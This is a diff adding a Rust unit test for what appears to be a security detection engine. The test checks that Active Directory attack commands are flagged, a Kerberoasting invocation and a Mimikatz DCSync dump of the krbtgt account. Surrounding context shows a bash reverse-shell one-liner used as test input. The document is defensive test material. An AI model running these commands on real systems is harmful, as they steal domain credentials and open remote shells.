@@ -115,6 +115,25 @@ mod tests {
     }
 
     #[test]
+    fn windows_kb_detects_ad_tradecraft() {
+        let report = analyze("Invoke-Kerberoast -OutputFormat Hashcat", &win_kb());
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "kerberoast-invoke")
+        );
+
+        let dcsync = analyze("lsadump::dcsync /domain:corp.local /user:krbtgt", &win_kb());
+        let f = dcsync
+            .findings
+            .iter()
+            .find(|f| f.rule_id == "dcsync")
+            .unwrap();
+        assert_eq!(f.techniques[0].id, "T1003.006");
+    }
+
+    #[test]
     fn detects_reverse_shell() {
         let report = analyze("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", &kb());
         assert!(
